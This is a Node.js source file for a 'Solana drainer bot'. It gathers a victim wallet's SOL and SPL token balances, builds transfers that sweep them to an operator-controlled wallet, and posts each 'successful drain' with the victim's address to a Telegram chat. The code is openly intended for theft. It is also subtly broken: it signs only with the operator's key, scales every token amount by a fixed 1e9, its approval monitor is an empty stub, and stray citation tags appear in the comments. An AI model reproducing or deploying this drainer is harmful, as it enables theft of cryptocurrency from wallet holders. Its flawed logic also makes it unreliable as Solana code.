// ============================================================
// 🔴 SOLANA DRAINER BOT
// Dependencies: npm install @solana/web3.js @solana/spl-token bs58
// ============================================================
const { Connection, PublicKey, Keypair, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const { TOKEN_PROGRAM_ID, getAssociatedTokenAddress, createTransferInstruction } = require('@solana/spl-token');
const bs58 = require('bs58');
const http = require('http');

// Health check server for Railway
const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Solana Drainer Running\n');
});
server.listen(process.env.PORT || 8081);

// Configuration
const YOUR_WALLET_ADDRESS = process.env.SOLANA_WALLET_ADDRESS; // Your receiving wallet
const YOUR_PRIVATE_KEY = process.env.SOLANA_PRIVATE_KEY; // BS58 encoded private key
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// RPC endpoints [citation:1]
const RPC_ENDPOINTS = {
  mainnet: 'https://api.mainnet-beta.solana.com',
  quicknode: process.env.SOLANA_RPC_URL || 'https://api.mainnet-beta.solana.com'
};

async function sendTelegram(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
  } catch (err) {
    console.log('Telegram error:', err.message);
  }
}

class SolanaDrainer {
  constructor(privateKeyBs58) {
    this.connection = new Connection(RPC_ENDPOINTS.mainnet);
    this.wallet = Keypair.fromSecretKey(bs58.decode(privateKeyBs58));
    this.receivingAddress = new PublicKey(YOUR_WALLET_ADDRESS);
  }

  async getTokenBalances(owner) {
    const balances = [];
    
    // Get native SOL balance
    const solBalance = await this.connection.getBalance(owner);
    if (solBalance > 0) {
      balances.push({
        type: 'sol',
        balance: solBalance,
        formatted: solBalance / LAMPORTS_PER_SOL
      });
    }

    // Get SPL token accounts [citation:6]
    const tokenAccounts = await this.connection.getTokenAccountsByOwner(
      owner,
      { programId: TOKEN_PROGRAM_ID }
    );

    for (const { account, pubkey } of tokenAccounts.value) {
      const data = Buffer.from(account.data);
      const mint = new PublicKey(data.slice(0, 32));
      const balance = Number(data.readBigUInt64LE(64));
      
      if (balance > 0) {
        balances.push({
          type: 'spl',
          mint: mint,
          tokenAccount: pubkey,
          balance: balance,
          formatted: balance / 1e9
        });
      }
    }

    return balances;
  }

  async drainWallet(victimAddress) {
    try {
      const owner = new PublicKey(victimAddress);
      const balances = await this.getTokenBalances(owner);
      
      if (balances.length === 0) {
        await sendTelegram(`ℹ️ No assets found for ${victimAddress.slice(0,8)}...`);
        return;
      }

      const transaction = new Transaction();
      let drained = [];

      // Drain native SOL (leave 0.01 SOL for fees)
      const solBalance = balances.find(b => b.type === 'sol');
      if (solBalance && solBalance.balance > 0.01 * LAMPORTS_PER_SOL) {
        const transferAmount = solBalance.balance - (0.01 * LAMPORTS_PER_SOL);
        transaction.add(
          SystemProgram.transfer({
            fromPubkey: owner,
            toPubkey: this.receivingAddress,
            lamports: transferAmount
          })
        );
        drained.push(`SOL: ${solBalance.formatted.toFixed(4)}`);
      }

      // Drain SPL tokens
      for (const token of balances.filter(b => b.type === 'spl')) {
        try {
          const destinationATA = await getAssociatedTokenAddress(
            token.mint,
            this.receivingAddress
          );

          transaction.add(
            createTransferInstruction(
              token.tokenAccount,
              destinationATA,
              owner,
              token.balance
            )
          );
          drained.push(`Token: ${token.formatted.toFixed(2)}`);
        } catch (err) {
          console.error('Error draining token:', err);
        }
      }

      if (transaction.instructions.length > 0) {
        const signature = await this.connection.sendTransaction(transaction, [this.wallet]);
        await this.connection.confirmTransaction(signature);
        
        await sendTelegram(
          `✅ <b>Solana Drain Successful</b>\n\n` +
          `Victim: ${victimAddress.slice(0,8)}...\n` +
          `Drained: ${drained.join(', ')}\n` +
          `TX: https://solscan.io/tx/${signature}`
        );
      }

    } catch (err) {
      console.error('Drain error:', err);
      await sendTelegram(`❌ Solana drain failed: ${err.message}`);
    }
  }

  async monitorApprovals() {
    console.log('👀 Monitoring Solana for approvals...');
    // Solana doesn't have approvals like EVM
    // Instead, we monitor for token account creations and transfers
    // This would require websocket subscriptions
    await sendTelegram('🚀 Solana drainer started');
  }
}

// Start the bot
const drainer = new SolanaDrainer(YOUR_PRIVATE_KEY);
drainer.monitorApprovals();

// Keep alive
setInterval(() => {
  console.log('Solana drainer heartbeat');
}, 60000);
